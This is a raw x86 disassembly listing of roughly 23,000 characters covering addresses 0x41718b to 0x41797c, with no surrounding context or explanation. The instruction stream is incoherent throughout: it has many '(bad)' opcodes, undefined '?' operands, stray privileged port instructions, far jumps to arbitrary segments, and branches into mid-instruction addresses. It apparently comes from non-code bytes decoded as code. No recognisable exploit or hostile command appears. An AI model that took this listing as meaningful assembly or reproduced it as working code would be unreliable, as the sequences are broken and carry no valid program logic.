  41718b:	lods   eax,DWORD PTR ds:[esi]
  41718c:	out    0x68,eax
  41718e:	jne    0x417124
  417190:	cdq    
  417191:	push   esi
  417192:	sbb    DWORD PTR [ecx+0x74f28f78],0x67036022
  41719c:	and    al,0x7e
  41719e:	mov    ah,0x8b
  4171a0:	inc    esi
  4171a1:	clc    
  4171a2:	inc    esp
  4171a3:	pop    edx
  4171a4:	gs adc eax,0xfe372d71
  4171aa:	test   DWORD PTR [edx+0x15ec29f2],eax
  4171b0:	and    al,0x56
  4171b2:	sub    BYTE PTR [ebx],ah
  4171b4:	lahf   
  4171b5:	push   edi
  4171b6:	inc    ebp
  4171b7:	out    dx,eax
  4171b8:	mov    BYTE PTR [esi],bh
  4171ba:	div    bl
  4171bc:	dec    edx
  4171bd:	jecxz  0x417223
  4171bf:	mov    esi,0x9692ee60
  4171c4:	nop
  4171c5:	push   ebx
  4171c6:	sbb    esi,DWORD PTR ds:0x2dcf82c4
  4171cc:	aaa    
  4171cd:	sbb    DWORD PTR [eax-0x67],esi
  4171d0:	cmp    al,0xa3
  4171d2:	xchg   edx,eax
  4171d3:	xchg   ecx,eax
  4171d4:	xchg   esp,eax
  4171d5:	dec    DWORD PTR [ecx]
  4171d7:	push   ecx
  4171d8:	mov    bl,0xaf
  4171da:	add    ah,BYTE PTR [edi]
  4171dc:	cmp    al,0xfb
  4171de:	pop    ebp
  4171df:	fiadd  DWORD PTR [edi-0x65760e9e]
  4171e5:	inc    eax
  4171e6:	mov    ebp,0xb848e408
  4171eb:	mov    ebx,0x950044a7
  4171f0:	mov    al,BYTE PTR [edi-0x3b9ad5d]
  4171f6:	repnz add esp,edi
  4171f9:	cs sahf 
  4171fb:	cmc    
  4171fc:	adc    eax,0xf144884c
  417201:	push   0x45b1f77d
  417206:	loopne 0x4171da
  417208:	ret    0xa892
  41720b:	sub    ch,dh
  41720d:	xchg   edi,eax
  41720e:	jg     0x4171a0
  417210:	cmp    eax,0x25fd6437
  417215:	push   edx
  417216:	mov    dl,0x78
  417218:	mov    bh,0x77
  41721a:	or     eax,0x63b07439
  41721f:	xchg   esi,eax
  417220:	lock dec edi
  417222:	sub    al,0x55
  417224:	icebp  
  417225:	data16 sti 
  417227:	rol    BYTE PTR ds:0xc0545d88,cl
  41722d:	test   BYTE PTR [edi+edx*4+0x55],cl
  417231:	mov    esp,DWORD PTR [edx]
  417233:	stos   BYTE PTR es:[edi],al
  417234:	ins    DWORD PTR es:[edi],dx
  417235:	mov    fs,WORD PTR [eax+esi*2-0x44b70d75]
  41723c:	aaa    
  41723d:	sub    al,0xba
  41723f:	add    DWORD PTR [edx],ecx
  417241:	lea    ebp,[eax]
  417243:	fidivr WORD PTR [edx-0x2af906e0]
  417249:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41724a:	xchg   edx,eax
  41724b:	and    eax,0xde105df0
  417250:	inc    eax
  417251:	not    BYTE PTR [esi+eiz*8+0xd6bb7ba]
  417258:	and    ah,BYTE PTR [eax]
  41725a:	daa    
  41725b:	mov    esp,0x5ba7f8c7
  417260:	sub    BYTE PTR [ebp+0x0],cl
  417263:	pop    edx
  417264:	ss sbb al,0x97
  417267:	jb     0x417267
  417269:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41726a:	mov    bl,0x27
  41726c:	pop    edx
  41726d:	hlt    
  41726e:	xchg   esp,eax
  41726f:	mov    ch,0x26
  417271:	push   DWORD PTR [eax+0x403e391a]
  417277:	ret    0x2463
  41727a:	inc    ecx
  41727b:	push   0x4a
  41727d:	xchg   esi,eax
  41727e:	mov    ?,WORD PTR [eax+0x44]
  417281:	outs   dx,DWORD PTR ds:[esi]
  417282:	imul   ebp,ecx,0x21
  417285:	jle    0x4172fe
  417287:	adc    edx,ebp
  417289:	imul   esp,edi,0x4e
  41728c:	or     ecx,DWORD PTR [edi+0x6a]
  41728f:	sub    BYTE PTR [eax-0x31feef20],dh
  417295:	push   edi
  417296:	lock xlat BYTE PTR ds:[ebx]
  417298:	out    dx,al
  417299:	push   ds
  41729a:	and    ah,cl
  41729c:	pop    ds
  41729d:	inc    ecx
  41729e:	cmp    al,0x99
  4172a0:	xor    BYTE PTR [esi-0x5d],bh
  4172a3:	scas   eax,DWORD PTR es:[edi]
  4172a4:	retf   
  4172a5:	lods   eax,DWORD PTR ds:[esi]
  4172a6:	jne    0x4172cd
  4172a8:	sub    al,0x17
  4172aa:	jno    0x4172e3
  4172ac:	or     ebx,ebx
  4172ae:	lea    ecx,[ebx]
  4172b0:	(bad)
  4172b3:	sahf   
  4172b4:	cdq    
  4172b5:	mov    eax,ds:0xa4bb8916
  4172ba:	mov    esi,0xa716052a
  4172bf:	lods   eax,DWORD PTR ds:[esi]
  4172c0:	cmp    al,BYTE PTR [ecx]
  4172c2:	pop    ecx
  4172c3:	and    eax,0x97a4374e
  4172c8:	ficom  WORD PTR [edi+ebx*2+0x7e]
  4172cc:	or     DWORD PTR [ebx+eiz*2-0x60c5037c],0xc7e0786
  4172d7:	aas    
  4172d8:	lods   eax,DWORD PTR ds:[esi]
  4172d9:	mov    edi,0xd851322b
  4172de:	retf   0xfe99
  4172e1:	mov    al,ds:0x93320d5f
  4172e6:	cli    
  4172e7:	fdiv   QWORD PTR [eax]
  4172e9:	add    ch,dh
  4172eb:	adc    BYTE PTR [ebx],cl
  4172ed:	daa    
  4172ee:	sbb    edi,DWORD PTR [edi+0x78]
  4172f1:	sub    eax,0xee7d9d6c
  4172f6:	push   ds
  4172f7:	pusha  
  4172f8:	adc    DWORD PTR [esi-0x4752720f],esp
  4172fe:	xor    DWORD PTR [eax-0x20ede9e7],ebp
  417304:	test   BYTE PTR ds:0x4fa89e4,ch
  41730a:	add    al,0xa7
  41730c:	ss inc ebp
  41730e:	clc    
  41730f:	repz mov edx,0x467c15fd
  417315:	lods   al,BYTE PTR ds:[esi]
  417316:	jmp    0x9a9e:0x6cbacb86
  41731d:	add    eax,0xc3d14697
  417322:	push   eax
  417323:	sub    BYTE PTR [esi+ebx*1+0x7b],dh
  417327:	push   ebx
  417328:	adc    al,BYTE PTR [ebx+eax*2+0x38212ab0]
  41732f:	sub    edi,DWORD PTR [ecx+0x24]
  417332:	dec    eax
  417333:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417334:	idiv   DWORD PTR [ebx]
  417336:	fs pop esi
  417338:	arpl   WORD PTR [ecx-0xc85aecf],ax
  41733e:	xchg   ebp,eax
  41733f:	cwde   
  417340:	dec    edx
  417341:	adc    BYTE PTR [edi-0x5529ce32],dh
  417347:	lods   al,BYTE PTR ds:[esi]
  417348:	int    0xe1
  41734a:	push   ecx
  41734b:	ds in  al,dx
  41734d:	or     eax,0x95b1a473
  417352:	jl     0x4172ef
  417354:	push   eax
  417355:	dec    ebx
  417356:	mov    al,0x4c
  417358:	nop
  417359:	outs   dx,BYTE PTR ds:[esi]
  41735a:	retf   0x2fbc
  41735d:	add    eax,0x49848da5
  417362:	add    al,0xf3
  417364:	shl    DWORD PTR ds:0xbe9a9e6f,1
  41736a:	das    
  41736b:	jge    0x4173a8
  41736d:	loop   0x417351
  41736f:	mov    ds:0x8855e7d7,eax
  417374:	lea    edi,[edi]
  417376:	mov    esp,0x79f484cf
  41737b:	test   BYTE PTR [eax-0x33],dl
  41737e:	cld    
  41737f:	adc    eax,0x40f43e6f
  417384:	mov    ah,0x4c
  417386:	jecxz  0x417378
  417388:	pop    esi
  417389:	and    edi,DWORD PTR [ebp-0x2a81e104]
  41738f:	push   0x8b94fd91
  417394:	inc    esi
  417395:	repz mov esp,?
  417398:	push   edi
  417399:	push   edx
  41739a:	stc    
  41739b:	xchg   edx,eax
  41739c:	pop    ebx
  41739d:	mov    ebp,0x1847ad4
  4173a2:	hlt    
  4173a3:	add    eax,0x6bc647a0
  4173a8:	sbb    al,0xe4
  4173aa:	jne    0x417424
  4173ac:	popa   
  4173ad:	dec    ecx
  4173ae:	pop    ecx
  4173af:	cmp    al,0xc6
  4173b1:	int3   
  4173b2:	xor    DWORD PTR [edx+0x376df4c],edx
  4173b8:	mov    DWORD PTR [edi+0x7f62680d],eax
  4173be:	sbb    bl,BYTE PTR [edx-0x3c]
  4173c1:	loope  0x417352
  4173c3:	jl     0x4173c6
  4173c5:	dec    edi
  4173c6:	inc    edi
  4173c7:	push   edi
  4173c8:	ds mov dl,0x8c
  4173cb:	cdq    
  4173cc:	cmp    al,0x82
  4173ce:	mov    ecx,0x96c9a98f
  4173d3:	scas   al,BYTE PTR es:[edi]
  4173d4:	xor    DWORD PTR [ebp-0x6a],eax
  4173d7:	sub    ch,dh
  4173d9:	es ins BYTE PTR es:[edi],dx
  4173db:	push   ecx
  4173dc:	nop
  4173dd:	imul   ebp,DWORD PTR [edi-0x4203789e],0x19
  4173e4:	push   0x49
  4173e6:	retf   0x659c
  4173e9:	jbe    0x41738f
  4173eb:	mov    DWORD PTR [edi],esi
  4173ed:	repz adc al,0xcc
  4173f0:	lea    eax,[ebx+0x11]
  4173f3:	mov    edi,0xf8a27077
  4173f8:	jbe    0x41740a
  4173fa:	jo     0x4173c6
  4173fc:	sub    al,0x82
  4173fe:	repnz inc ecx
  417400:	sar    BYTE PTR [edi+0x15c2fa49],1
  417406:	fdivr  DWORD PTR [eax-0x79920515]
  41740c:	cmpps  xmm2,xmm1,0x69
  417410:	dec    edi
  417411:	xor    BYTE PTR [esi+0x9b6ac15],bh
  417417:	jnp    0x417429
  417419:	and    al,BYTE PTR [edi-0x4075ffc6]
  41741f:	inc    ebx
  417420:	pop    esp
  417421:	out    0xc4,eax
  417423:	mov    ecx,0x2ff8c62e
  417428:	sbb    ecx,DWORD PTR [ebx]
  41742a:	xchg   ebx,eax
  41742b:	retf   0xd587
  41742e:	sbb    DWORD PTR [ebx],0x6282dfea
  417434:	test   DWORD PTR [ecx+0x26e8c8ca],ebx
  41743a:	(bad)  
  41743b:	icebp  
  41743c:	add    DWORD PTR [ebp-0x36],0x36
  417440:	cmp    al,0x8
  417442:	retf   0xf4d0
  417445:	dec    ebx
  417446:	jb     0x4173f2
  417448:	outs   dx,BYTE PTR ds:[esi]
  417449:	inc    eax
  41744a:	cwde   
  41744b:	pcmpgtd mm4,QWORD PTR [ebp+0x13d59be7]
  417452:	xchg   edi,eax
  417453:	adc    al,BYTE PTR [edi]
  417455:	dec    esp
  417456:	push   esp
  417457:	cmp    eax,0x55bf743d
  41745c:	jmp    0x1cf5:0x530bca1
  417463:	add    BYTE PTR [eax-0x25fd5673],0xa
  41746a:	sub    ebp,DWORD PTR [edi-0x2d]
  41746d:	cmp    BYTE PTR [edi-0x3b],ch
  417470:	call   FWORD PTR [esi-0x234a1b9f]
  417476:	in     al,dx
  417477:	jmp    0x1d83:0xffea5777
  41747e:	mov    DWORD PTR [esi+0x5],edi
  417481:	clc    
  417482:	jecxz  0x417451
  417484:	pop    ebp
  417485:	imul   edi,DWORD PTR [edx],0x802993fe
  41748b:	std    
  41748c:	or     dl,cl
  41748e:	jmp    0x69f3:0xb792f3d6
  417495:	pop    es
  417496:	mov    bl,0xcb
  417498:	mov    ds:0x2b87c177,al
  41749d:	dec    esp
  41749e:	rcl    DWORD PTR [ebp+0x3f],cl
  4174a1:	inc    ebx
  4174a2:	push   esi
  4174a3:	sub    dh,BYTE PTR [esi]
  4174a5:	int3   
  4174a6:	sub    esp,ebx
  4174a8:	sti    
  4174a9:	mov    al,ds:0x6e1e385d
  4174ae:	mov    al,0x5b
  4174b0:	xor    bh,BYTE PTR [ecx+0x65]
  4174b3:	aad    0x2
  4174b5:	mov    es,WORD PTR [ebx]
  4174b7:	shl    DWORD PTR ds:0x630666e8,0x64
  4174be:	xchg   DWORD PTR [eax+0x7ee8c8da],eax
  4174c4:	ds pop ebx
  4174c6:	pop    edi
  4174c7:	add    eax,0x19ec580b
  4174cc:	pop    ecx
  4174cd:	dec    ebp
  4174ce:	cmp    edi,DWORD PTR [eax-0x2f]
  4174d1:	fsub   DWORD PTR [edx-0x6a63d256]
  4174d7:	fs fsubr st,st(0)
  4174da:	mov    dh,BYTE PTR [esi-0x16e41258]
  4174e0:	inc    ebx
  4174e1:	sbb    al,0x77
  4174e3:	or     ebp,eax
  4174e5:	cdq    
  4174e6:	push   ebx
  4174e7:	enter  0xc587,0x8e
  4174eb:	or     BYTE PTR [edx-0x2fa15907],dl
  4174f1:	adc    bl,BYTE PTR [ebx+eax*4+0x5c3cde8d]
  4174f8:	cli    
  4174f9:	pop    ebp
  4174fa:	pop    esi
  4174fb:	pop    ss
  4174fc:	bound  ecx,QWORD PTR [ecx+0x2ce663da]
  417502:	(bad)  
  417503:	push   cs
  417504:	mov    al,0x67
  417506:	mov    eax,ds:0xf62c8f13
  41750b:	fimul  DWORD PTR [eax+0x2f]
  41750e:	mov    eax,0xad094b5c
  417513:	pop    eax
  417514:	scas   eax,DWORD PTR es:[edi]
  417515:	fnstsw WORD PTR [ebx+0x5e64f998]
  41751b:	and    ecx,DWORD PTR [ebx+0x4146d20e]
  417521:	xor    al,0x79
  417523:	dec    ebx
  417524:	inc    eax
  417525:	ja     0x4174ef
  417527:	lods   eax,DWORD PTR ds:[esi]
  417528:	jp     0x417515
  41752a:	clc    
  41752b:	or     al,0xe9
  41752d:	adc    dh,BYTE PTR [ecx]
  41752f:	push   esp
  417530:	mov    esi,0x16de27b8
  417535:	js     0x417513
  417537:	aad    0x4b
  417539:	clc    
  41753a:	(bad)  
  41753b:	or     eax,0x37606fb
  417540:	xchg   edi,eax
  417541:	or     eax,0x2179820b
  417546:	pop    ss
  417547:	jo     0x417525
  417549:	mov    cl,0x57
  41754b:	mov    ebp,0xda79380
  417550:	dec    ecx
  417551:	sub    eax,0x3f7c85a8
  417556:	jae    0x4174e1
  417558:	xchg   ecx,eax
  417559:	mov    ebx,0xe5ae45ba
  41755e:	xchg   DWORD PTR [esp+eax*4-0x2775449a],edi
  417565:	ror    DWORD PTR [esi+0x39e20088],1
  41756b:	inc    eax
  41756c:	push   DWORD PTR [edi]
  41756e:	and    al,0x18
  417570:	jecxz  0x417566
  417572:	and    DWORD PTR [esi+0x3d4818d3],ebp
  417578:	sbb    dh,al
  41757a:	je     0x4175ce
  41757c:	in     al,dx
  41757d:	mov    ?,WORD PTR [ebx]
  41757f:	dec    ebp
  417580:	hlt    
  417581:	out    0x8d,eax
  417583:	ret    0x2bff
  417586:	xor    al,0x36
  417588:	inc    ebp
  417589:	das    
  41758a:	push   edx
  41758b:	repz or eax,0x9472f50
  417591:	test   eax,ebp
  417593:	push   esp
  417594:	fs es xor bh,0x88
  417599:	loop   0x4175a7
  41759b:	shl    eax,0x91
  41759e:	(bad)  
  41759f:	jp     0x4175e7
  4175a1:	sbb    BYTE PTR [edi-0x8],dl
  4175a4:	cmp    BYTE PTR [ebx],dl
  4175a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175a7:	adc    al,0x5b
  4175a9:	rcr    DWORD PTR [edx],1
  4175ab:	pop    esp
  4175ac:	and    al,0x8f
  4175ae:	inc    esi
  4175af:	adc    dl,BYTE PTR [esi]
  4175b1:	mov    eax,ds:0xc4bcc3c5
  4175b6:	leave  
  4175b7:	jle    0x4175fe
  4175b9:	add    bl,dh
  4175bb:	inc    edx
  4175bc:	iret   
  4175bd:	adc    eax,0x70c4f0df
  4175c2:	lods   al,BYTE PTR ds:[esi]
  4175c3:	clc    
  4175c4:	mov    ch,BYTE PTR [ecx+0x307008]
  4175ca:	or     ebp,0x9527ebe2
  4175d0:	pop    esi
  4175d1:	mov    bh,0xb0
  4175d3:	pushf  
  4175d4:	ins    BYTE PTR es:[edi],dx
  4175d5:	fistp  DWORD PTR [eax]
  4175d7:	int3   
  4175d8:	jno    0x417645
  4175da:	sahf   
  4175db:	cmp    al,0x2f
  4175dd:	push   cs
  4175de:	and    eax,0xf1eb7597
  4175e3:	and    esi,DWORD PTR [edi]
  4175e5:	in     al,dx
  4175e6:	out    dx,eax
  4175e7:	xchg   ebx,eax
  4175e8:	ss out 0x63,al
  4175eb:	mov    ecx,0xec47cf83
  4175f0:	(bad)  
  4175f1:	fdivr  QWORD PTR [ecx]
  4175f3:	sub    ebp,ecx
  4175f5:	out    0xc0,eax
  4175f7:	(bad)  
  4175f9:	sti    
  4175fa:	shl    ecx,cl
  4175fc:	xchg   esp,eax
  4175fd:	cmp    al,0x7b
  4175ff:	push   es
  417600:	mov    esp,0xc25eb029
  417605:	dec    esp
  417606:	sbb    al,0x13
  417608:	ins    BYTE PTR es:[edi],dx
  417609:	(bad)  
  41760a:	fcom   DWORD PTR [edi+0x22]
  41760d:	cmp    eax,edx
  41760f:	sbb    BYTE PTR [eax],dh
  417611:	xchg   esi,eax
  417612:	ins    BYTE PTR es:[edi],dx
  417613:	push   ds
  417614:	fistp  QWORD PTR [ecx]
  417616:	mov    edx,0xda57d88d
  41761b:	inc    edx
  41761c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41761d:	aas    
  41761e:	mov    ds:0x365b6405,al
  417623:	adc    DWORD PTR [eax-0x3c],ecx
  417626:	int    0x7f
  417628:	or     ebx,DWORD PTR [ebx+0x5d5af941]
  41762e:	ss push ecx
  417630:	sub    ebp,DWORD PTR [eax+eiz*8]
  417633:	inc    esp
  417634:	sbb    al,0xae
  417636:	ins    DWORD PTR es:[edi],dx
  417637:	inc    edx
  417638:	mov    bh,BYTE PTR [ecx-0x5f]
  41763b:	push   edi
  41763c:	add    eax,0x67b8b5ef
  417641:	lock push ss
  417643:	sub    ebp,ecx
  417645:	dec    ebx
  417646:	icebp  
  417647:	cmp    al,0x71
  417649:	xor    cl,BYTE PTR [eax+0x61d7bd9f]
  41764f:	mov    ah,0xd7
  417651:	mov    ecx,DWORD PTR [edi]
  417653:	mov    ebp,ebp
  417655:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417656:	jno    0x41769c
  417658:	sar    DWORD PTR [edi],1
  41765a:	out    dx,al
  41765b:	in     al,dx
  41765c:	and    DWORD PTR [esi+esi*8],edx
  41765f:	adc    esp,ebx
  417661:	adc    ebx,DWORD PTR [ebx]
  417663:	daa    
  417664:	mov    esp,0x26a5ab69
  417669:	cmc    
  41766a:	push   esi
  41766b:	mov    cl,0x60
  41766d:	fcmovnu st,st(7)
  41766f:	add    esp,esp
  417671:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417672:	sub    edx,DWORD PTR [ebp+0x53]
  417675:	rcr    ecx,cl
  417677:	ins    BYTE PTR es:[edi],dx
  417678:	aas    
  417679:	sub    eax,DWORD PTR [edx-0x39c63381]
  41767f:	push   edi
  417680:	js     0x4176ed
  417682:	pop    ds
  417683:	dec    edi
  417684:	std    
  417685:	adc    BYTE PTR [edi],bl
  417687:	not    edi
  417689:	out    dx,al
  41768a:	or     BYTE PTR [esi-0x62005cde],0x64
  417691:	sub    DWORD PTR [ebx*1+0x391bd597],edi
  417698:	push   esp
  417699:	cmc    
  41769a:	repz imul edx,DWORD PTR [edx+0x23887df3],0x17
  4176a2:	test   DWORD PTR [ebp-0x21449e5d],esi
  4176a8:	inc    edx
  4176a9:	nop
  4176aa:	mov    esi,ebx
  4176ac:	jmp    0x6c49aa5f
  4176b1:	inc    esp
  4176b2:	and    al,0x31
  4176b4:	jle    0x417719
  4176b6:	ja     0x417730
  4176b8:	xchg   BYTE PTR [ebp+0x27],cl
  4176bb:	push   edx
  4176bc:	ret    
  4176bd:	retf   0x123a
  4176c0:	ss pop ebp
  4176c2:	sbb    BYTE PTR ds:0xa384534,ah
  4176c8:	add    DWORD PTR [ecx],esp
  4176ca:	fwait
  4176cb:	icebp  
  4176cc:	dec    edi
  4176cd:	inc    eax
  4176ce:	or     DWORD PTR [eax+0x153909d9],0x88df0142
  4176d8:	daa    
  4176d9:	das    
  4176da:	pop    edi
  4176db:	add    bh,BYTE PTR gs:[ecx-0x4d]
  4176df:	add    DWORD PTR ds:0xde7d72c,ebp
  4176e5:	cdq    
  4176e6:	(bad)  [edx+edi*8]
  4176e9:	mov    esi,0x92489325
  4176ee:	call   FWORD PTR [ecx-0x48]
  4176f1:	sbb    bl,BYTE PTR [esi+0x17889e5b]
  4176f7:	aaa    
  4176f8:	and    esi,DWORD PTR [ebx-0x303be74b]
  4176fe:	pop    esi
  4176ff:	icebp  
  417700:	or     ebx,DWORD PTR [edx-0x75c19677]
  417706:	nop
  417707:	xor    eax,ecx
  417709:	int3   
  41770a:	fld    TBYTE PTR [eax-0x12]
  41770d:	je     0x41772c
  41770f:	mov    dh,0xbf
  417711:	mov    eax,0xd5317c7
  417716:	repnz xchg edi,eax
  417719:	dec    ax
  41771b:	repnz xchg edx,eax
  41771d:	bound  esp,QWORD PTR [edx+0x56]
  417720:	pop    edx
  417721:	xchg   DWORD PTR [ecx],ebx
  417723:	rol    esi,0xbf
  417726:	pop    esi
  417727:	and    bl,bh
  417729:	adc    BYTE PTR [eax-0x69],ch
  41772c:	push   esi
  41772d:	and    DWORD PTR [ebx],edi
  41772f:	dec    ecx
  417730:	mov    cl,0x3e
  417732:	call   0xc8e6:0x18251be4
  417739:	imul   esp,edx,0xffffffe0
  41773c:	loopne 0x417742
  41773e:	inc    ebp
  41773f:	(bad)  
  417740:	cmp    esi,DWORD PTR [edx+0x5b4b66cf]
  417746:	fcmovbe st,st(5)
  417749:	fucom  st(0)
  41774b:	mov    dl,0x7e
  41774d:	push   0xa7873d69
  417752:	jmp    0xac8cb78
  417757:	cmp    al,0xa7
  417759:	or     ah,bl
  41775b:	add    al,0x3a
  41775d:	mov    esi,0xc2328d4d
  417762:	jo     0x41772b
  417764:	jp     0x4176f8
  417766:	sub    eax,0x596d119c
  41776b:	and    DWORD PTR [eax],ebx
  41776d:	adc    BYTE PTR [esi+0x5ca63925],dl
  417773:	mov    esi,0x1ec767b1
  417778:	and    al,0x19
  41777a:	inc    esp
  41777b:	sbb    edi,esi
  41777d:	inc    ebp
  41777e:	imul   esp,esi,0xc5460275
  417784:	cdq    
  417785:	add    BYTE PTR [ebx+ecx*2-0x748428b3],0xe6
  41778d:	(bad)  
  41778e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41778f:	or     eax,0x2240b55
  417794:	(bad)  
  417795:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417796:	inc    eax
  417797:	out    0x32,eax
  417799:	(bad)  
  41779a:	iret   
  41779b:	shr    DWORD PTR [esi-0x795e3973],1
  4177a1:	fld    TBYTE PTR [edi]
  4177a3:	jnp    0x417738
  4177a5:	xor    al,0x5d
  4177a7:	arpl   WORD PTR [ebp-0x61],ax
  4177aa:	xchg   edx,eax
  4177ab:	repnz xlat BYTE PTR ds:[ebx]
  4177ad:	dec    edi
  4177ae:	mov    ?,WORD PTR [ebx]
  4177b0:	sti    
  4177b1:	sahf   
  4177b2:	ins    DWORD PTR es:[edi],dx
  4177b3:	push   cs
  4177b4:	or     al,0x1a
  4177b6:	jl     0x417800
  4177b8:	push   esi
  4177b9:	ja     0x41781d
  4177bb:	(bad)  
  4177bd:	shl    DWORD PTR [esi+ecx*8-0x2d],0x6
  4177c2:	push   es
  4177c3:	fld    TBYTE PTR [eax]
  4177c5:	sahf   
  4177c6:	pop    ds
  4177c7:	pop    ebp
  4177c8:	xor    cl,ch
  4177ca:	shl    DWORD PTR [ebx+0x43dbc90a],cl
  4177d0:	pop    ds
  4177d1:	pop    eax
  4177d2:	in     al,dx
  4177d3:	stos   DWORD PTR es:[edi],eax
  4177d4:	outs   dx,DWORD PTR ds:[esi]
  4177d5:	mov    dh,BYTE PTR [ecx+0x56]
  4177d8:	pop    eax
  4177d9:	neg    al
  4177db:	bnd jp 0x417823
  4177de:	push   0xe
  4177e0:	sbb    eax,DWORD PTR [eax-0x75162a1c]
  4177e6:	mov    ds,WORD PTR [ebp+0x98ff259]
  4177ec:	cmp    DWORD PTR [ebp+0x3],ebp
  4177ef:	adc    DWORD PTR [ebx+0x41],ebp
  4177f2:	sbb    al,0x7a
  4177f4:	aad    0xe9
  4177f6:	mov    dl,0x19
  4177f8:	xor    al,0x82
  4177fa:	mov    ch,BYTE PTR [esi]
  4177fc:	out    dx,eax
  4177fd:	jge    0x417820
  4177ff:	mov    ecx,0x9b2b6c32
  417804:	dec    ecx
  417805:	jne    0x4177e7
  417807:	xor    ebx,DWORD PTR [ecx+0x52]
  41780a:	sub    al,0xf9
  41780c:	rcr    BYTE PTR [edx+0x4e],0x65
  417810:	icebp  
  417811:	icebp  
  417812:	add    BYTE PTR [ecx-0x6d780ceb],bh
  417818:	add    DWORD PTR [edi+0x19],esp
  41781b:	sbb    eax,0x256fe192
  417820:	or     DWORD PTR [edi-0x80],ebx
  417823:	ficom  DWORD PTR [ebp-0x7c]
  417826:	mov    ecx,0x44d45377
  41782b:	or     ebx,DWORD PTR [esp+edi*1+0x6a399ffc]
  417832:	retf   0x3750
  417835:	mov    cs,ebp
  417837:	cmp    dl,BYTE PTR [ecx+edi*4+0x6720503e]
  41783e:	in     al,dx
  41783f:	int3   
  417840:	adc    ebx,DWORD PTR [ebx-0x6eec52c4]
  417846:	mov    al,0x86
  417848:	sar    DWORD PTR gs:[edx],1
  41784b:	std    
  41784c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41784d:	leave  
  41784e:	sbb    BYTE PTR [edx],0xbb
  417851:	adc    ah,cl
  417853:	fisttp DWORD PTR [ebp+0x5acfd32d]
  417859:	cmp    cl,dh
  41785b:	sub    BYTE PTR [ebx-0x165ea341],bh
  417861:	ja     0x417851
  417863:	sti    
  417864:	and    al,0x9e
  417866:	push   0x87117666
  41786b:	sti    
  41786c:	cmp    esp,edx
  41786e:	inc    ecx
  41786f:	in     al,0xfc
  417871:	cdq    
  417872:	pop    eax
  417873:	sub    ebx,esp
  417875:	ret    0xcd38
  417878:	fdiv   QWORD PTR [edi]
  41787a:	xor    edx,ebp
  41787c:	xchg   BYTE PTR ds:0xf7f7a4b0,al
  417882:	lahf   
  417883:	out    dx,al
  417884:	dec    ebp
  417885:	and    BYTE PTR [ebp-0x6038165c],ch
  41788b:	out    0x6a,al
  41788d:	mov    cs,WORD PTR [esi+esi*2+0x48221bd3]
  417894:	push   eax
  417895:	(bad)  
  417896:	xchg   DWORD PTR [edx+0x74ab8cd8],eax
  41789c:	mov    ah,0xdc
  41789e:	in     al,0xb
  4178a0:	into   
  4178a1:	mov    cl,0xd6
  4178a3:	fs jmp 0x6cf14176
  4178a9:	imul   ebp,edi,0xffffff8f
  4178ac:	enter  0xcf2a,0xfb
  4178b0:	into   
  4178b1:	mov    dh,0x6a
  4178b3:	in     eax,0xe4
  4178b5:	fiadd  WORD PTR [ecx+0x2d522ee6]
  4178bb:	and    eax,ebp
  4178bd:	adc    ebp,DWORD PTR [ecx-0x33f9ef5f]
  4178c3:	lock adc al,0x35
  4178c6:	adc    eax,0xa30e3af6
  4178cb:	push   esi
  4178cc:	out    dx,eax
  4178cd:	pop    eax
  4178ce:	cmc    
  4178cf:	(bad)  
  4178d0:	repnz xor edi,ebp
  4178d3:	jecxz  0x4178d3
  4178d5:	sbb    ebx,0x72
  4178d8:	pop    ebx
  4178d9:	jae    0x4178ad
  4178db:	xor    ecx,edi
  4178dd:	xor    esp,esp
  4178df:	jle    0x4178db
  4178e1:	mov    ah,0x5c
  4178e3:	outs   dx,BYTE PTR ds:[esi]
  4178e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178e5:	xchg   esp,eax
  4178e6:	das    
  4178e7:	ss inc esp
  4178e9:	jmp    0x4becfd6e
  4178ee:	mov    esi,0xa4b313a8
  4178f3:	xchg   edx,eax
  4178f4:	into   
  4178f5:	jbe    0x41790a
  4178f7:	sbb    ebx,DWORD PTR [edx]
  4178f9:	repz cdq 
  4178fb:	sub    DWORD PTR ds:0x1286053b,edx
  417901:	mov    ebp,DWORD PTR [ecx+0x2a]
  417904:	add    BYTE PTR [edi],0x51
  417907:	int    0xf0
  417909:	sub    ah,BYTE PTR [edx+edx*8-0x5bf081fe]
  417910:	(bad)  [ecx-0x4469d9b0]
  417916:	pop    ebp
  417917:	imul   esp,DWORD PTR [edx+ebp*2-0x6],0xffffffa9
  41791c:	xor    BYTE PTR [ecx-0x14],bl
  41791f:	add    BYTE PTR [esi+0x47],0xe1
  417923:	lods   eax,DWORD PTR ds:[esi]
  417924:	adc    BYTE PTR ds:0xc41a1dc5,cl
  41792a:	mov    cl,0xf1
  41792c:	int    0xc6
  41792e:	mov    bh,0x39
  417930:	push   edx
  417931:	xchg   BYTE PTR [esp+ecx*4],dl
  417934:	xchg   ebp,eax
  417935:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417936:	and    ch,BYTE PTR [eax+0x66]
  417939:	jmp    0x2363:0xc1dac4f6
  417940:	test   eax,0xbf97424f
  417945:	retf   0x5c2d
  417948:	lock push ebp
  41794a:	idiv   al
  41794c:	xchg   ebp,eax
  41794d:	push   ds
  41794e:	icebp  
  41794f:	pop    eax
  417950:	outs   dx,DWORD PTR ds:[esi]
  417951:	pop    edx
  417952:	fsubp  st(3),st
  417954:	jo     0x4179c2
  417956:	mov    esi,0x5a81ae3
  41795b:	iret   
  41795c:	mov    eax,ds:0x7dcc26ad
  417961:	(bad)  
  417962:	aam    0x9c
  417964:	rcl    DWORD PTR [ebx+0x77],cl
  417967:	xor    edi,DWORD PTR [esi+0x57898a52]
  41796d:	cmp    eax,DWORD PTR [ebp+0x7990c385]
  417973:	jle    0x417907
  417975:	in     al,dx
  417976:	je     0x4179b5
  417978:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417979:	retf   
  41797a:	jbe    0x41792e
  41797c:	add    DWORD PTR [ebx+0x1],edi
